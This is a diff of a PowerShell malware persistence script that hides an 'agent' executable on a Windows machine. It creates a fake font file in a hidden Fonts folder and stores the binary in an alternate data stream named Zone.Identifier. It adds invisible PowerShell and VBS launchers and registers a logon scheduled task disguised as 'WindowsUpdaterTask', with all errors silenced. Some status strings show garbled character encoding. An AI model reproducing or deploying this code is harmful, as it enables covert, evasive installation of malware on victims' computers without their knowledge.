@@ -1,74 +1,126 @@
 $ProgressPreference = 'SilentlyContinue'
-$ErrorActionPreference = 'Stop'
+$ErrorActionPreference = 'SilentlyContinue'
+$WarningPreference = 'SilentlyContinue'
+$VerbosePreference = 'SilentlyContinue'
+$DebugPreference = 'SilentlyContinue'
+$InformationPreference = 'SilentlyContinue'
+param($args)
 
-# --- Find agent path automatically from running process ---
-$agentProc = Get-Process -Name "agent" -ErrorAction SilentlyContinue | Select-Object -First 1
-if (-not $agentProc) {
-    Write-Output "ERROR: No running agent.exe found"
-    exit 1
-}
-$sourcePath = $agentProc.Path
-Write-Output "[+] Found agent at: $sourcePath"
-
-# --- Stop the agent so we can copy it ---
-Write-Output "[+] Stopping current agent process (PID $($agentProc.Id))"
-Stop-Process -Id $agentProc.Id -Force
-Start-Sleep -Seconds 1
-
-# --- Hidden folder ---
-$hideDir = "$env:LOCALAPPDATA\Microsoft\Windows\Fonts"
-if (-not (Test-Path $hideDir)) {
-    New-Item -ItemType Directory -Path $hideDir -Force | Out-Null
-    attrib +h $hideDir
-    Write-Output "[+] Created hidden folder: $hideDir"
+$agentPath = $env:AgentPath
+if (-not $agentPath) {
+    Write-Output "âŒ AgentPath environment variable not set."
+    exit
 }
 
-# --- Copy agent to hidden folder ---
-$agentFile = "$hideDir\agent.exe"
-# Remove any existing file first
-if (Test-Path $agentFile) {
-    Remove-Item -Path $agentFile -Force -ErrorAction SilentlyContinue
+# --- 1. Create fake font file in Fonts folder ---
+$fontDir = "$env:LOCALAPPDATA\Microsoft\Windows\Fonts"
+if (-not (Test-Path $fontDir)) {
+    New-Item -ItemType Directory -Path $fontDir -Force | Out-Null
+    attrib +h $fontDir
+    Write-Output "[+] Created hidden fonts folder"
 }
-Copy-Item -LiteralPath $sourcePath -Destination $agentFile -Force
-if (-not (Test-Path $agentFile)) {
-    Write-Output "ERROR: Failed to copy agent to $agentFile"
-    exit 1
-}
-attrib +h $agentFile
-Write-Output "[+] Agent copied to: $agentFile ($((Get-Item $agentFile).Length) bytes)"
 
-# --- Launcher script (just runs the exe) ---
-$launcherPath = "$hideDir\run.ps1"
+$fontFile = "$fontDir\seguibl.ttf"
+if (-not (Test-Path $fontFile)) {
+    $fakeFontContent = "TTF fake font file - do not delete"
+    Set-Content -Path $fontFile -Value $fakeFontContent -Encoding ASCII -Force
+    attrib +h $fontFile
+    Write-Output "[+] Created fake font file: $fontFile"
+} else {
+    Write-Output "[+] Using existing font file: $fontFile"
+}
+
+# --- 2. Hide agent in ADS ---
+$streamName = "Zone.Identifier"
+Write-Output "[+] Hiding agent in ADS: $fontFile`:$streamName"
+$agentBytes = [System.IO.File]::ReadAllBytes($agentPath)
+Set-Content -Path $fontFile -Stream $streamName -Value $agentBytes -Encoding Byte
+$hiddenPath = "$fontFile`:$streamName"
+
+# --- 3. Create launcher script (run.ps1) with cleanup ---
+$launcherPath = "$fontDir\run.ps1"
 $launcherContent = @"
 `$ProgressPreference = 'SilentlyContinue'
-Start-Process -WindowStyle Hidden -FilePath '$agentFile'
+`$fontFile = '$fontFile'
+`$streamName = '$streamName'
+`$tempAgent = "`$env:TEMP\agent.exe"
+
+# Delete old temp file if it exists
+if (Test-Path `$tempAgent) { Remove-Item `$tempAgent -Force -ErrorAction SilentlyContinue }
+
+# Extract agent from ADS
+`$bytes = Get-Content -Path `$fontFile -Stream `$streamName -Encoding Byte -Raw -ErrorAction SilentlyContinue
+if (`$bytes) {
+    [System.IO.File]::WriteAllBytes(`$tempAgent, `$bytes)
+    Start-Process -WindowStyle Hidden `$tempAgent
+}
 "@
 Set-Content -Path $launcherPath -Value $launcherContent -Encoding ASCII -Force
 attrib +h $launcherPath
+Write-Output "[+] Created launcher with cleanup: $launcherPath"
 
-# --- VBS launcher ---
-$vbsPath = "$hideDir\run.vbs"
+# --- 4. Create VBS launcher (completely invisible) ---
+$vbsPath = "$fontDir\run.vbs"
+# Correct VBS syntax: double quotes inside the string are escaped by doubling them.
 $vbsContent = @"
 Set WshShell = CreateObject("WScript.Shell")
 WshShell.Run "powershell.exe -NoProfile -ExecutionPolicy Bypass -File ""$launcherPath""", 0, False
 "@
 Set-Content -Path $vbsPath -Value $vbsContent -Encoding ASCII -Force
 attrib +h $vbsPath
+Write-Output "[+] Created VBS launcher: $vbsPath"
 
-# --- Scheduled task: every 1 hour ---
-$taskName = "WindowsUpdaterTaskHourly"
-schtasks /delete /tn $taskName /f 2>$null
-schtasks /create /tn $taskName /tr "wscript.exe `"$vbsPath`"" /sc hourly /mo 1 /ru $env:USERNAME /f /it
-if ($LASTEXITCODE -eq 0) {
-    Write-Output "✅ Scheduled task created (runs every 1 hour)."
-    # Launch the agent now
-    Start-Process -WindowStyle Hidden -FilePath $agentFile
-    Write-Output "✅ Agent launched from hidden folder."
-} else {
-    Write-Output "❌ Task creation failed with exit code $LASTEXITCODE"
-    exit 1
+# --- 5. Create scheduled task (run the VBS) ---
+$taskName = "WindowsUpdaterTask"
+$taskCreated = $false
+
+# Try COM first
+try {
+    Write-Output "[*] Attempting to create task via COM..."
+    $taskService = New-Object -ComObject Schedule.Service
+    $taskService.Connect()
+    $rootFolder = $taskService.GetFolder("\")
+    try { $rootFolder.DeleteTask($taskName, 0) *>$null } catch { }
+
+    $taskDefinition = $taskService.NewTask(0)
+    $taskDefinition.RegistrationInfo.Description = "Windows Updater Task"
+    $taskDefinition.Principal.UserId = $env:USERNAME
+    $taskDefinition.Principal.LogonType = 3
+
+    $trigger = $taskDefinition.Triggers.Create(9)
+    $trigger.UserId = $env:USERNAME
+
+    $action = $taskDefinition.Actions.Create(0)
+    $action.Path = "wscript.exe"
+    $action.Arguments = "`"$vbsPath`""
+
+    $rootFolder.RegisterTaskDefinition($taskName, $taskDefinition, 6, $null, $null, 3) | Out-Null
+    Write-Output "[+] Scheduled task '$taskName' created/updated via COM (runs VBS)."
+    $taskCreated = $true
+} catch {
+    Write-Output "[-] COM task creation failed: $_"
 }
 
-Write-Output "`n✅ PERSISTENCE COMPLETE"
-Write-Output "Agent now runs from: $agentFile (hidden)"
-Write-Output "Task '$taskName' will re-launch it every hour."
+# Fallback to schtasks if COM failed
+if (-not $taskCreated) {
+    Write-Output "[*] Falling back to schtasks..."
+    schtasks /delete /tn $taskName /f *>$null
+    schtasks /create /tn $taskName /tr "wscript.exe `"$vbsPath`"" /sc onlogon /ru $env:USERNAME /f /it *>$null
+    if ($LASTEXITCODE -eq 0) {
+        Write-Output "[+] Scheduled task '$taskName' created/updated via schtasks (runs VBS)."
+        $taskCreated = $true
+    } else {
+        Write-Output "[-] schtasks failed with exit code $LASTEXITCODE"
+    }
+}
+
+if (-not $taskCreated) {
+    Write-Output "âŒ Failed to create scheduled task."
+} else {
+    Write-Output ""
+    Write-Output "âœ… PERSISTENCE COMPLETE"
+    Write-Output "Script location: $launcherPath"
+    Write-Output "VBS launcher: $vbsPath"
+    Write-Output "Agent hidden in: $hiddenPath"
+    Write-Output "The scheduled task will run the VBS (invisible) on next logon."
+}
